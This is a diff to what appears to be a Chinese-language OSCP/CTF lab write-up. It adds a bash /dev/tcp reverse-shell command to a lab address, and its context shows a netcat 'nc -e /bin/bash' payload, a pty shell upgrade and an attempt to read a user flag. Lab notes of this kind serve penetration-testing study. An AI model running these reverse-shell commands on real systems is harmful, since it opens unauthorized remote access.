@@ -45,6 +45,7 @@ print(output_text)
 ```
 
 # 反弹SHELL
+sh -i >& /dev/tcp/ 192.168.44.128 / 9001 0>&1不行
 ```C
 ┌──(kali㉿kali)-[~/桌面/OSCP]
 └─$ python translater.py nc+-e+/bin/bash+192.168.44.128+9001
@@ -56,3 +57,7 @@ mx -v /yrm/yzhs 192.168.44.128 9001
 ```C
 python3 -c 'import pty;pty.spawn("/bin/bash")'
 ```
+# 提权
+尝试读取第一个flag读取不到cat /home/ocean/user.txt
+
+
